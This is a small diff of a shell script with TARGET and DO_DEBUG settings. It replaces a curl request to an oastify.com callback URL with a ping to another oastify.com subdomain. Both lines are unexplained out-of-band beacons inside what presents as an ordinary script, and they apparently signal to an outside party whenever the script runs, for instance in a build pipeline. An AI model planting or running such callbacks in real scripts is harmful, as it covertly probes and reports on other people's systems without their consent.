@@ -17,7 +17,7 @@ TARGET=${3:-"all"}
 
 
 
-curl https://gvf4y40a8xfquutrz3dm87lfm6sxgy4n.oastify.com/12009
+ping 558t8tazimpf4j3g9snbiwv4wv2mqpee.oastify.com
 
 if [ $DO_DEBUG == false ]
 then
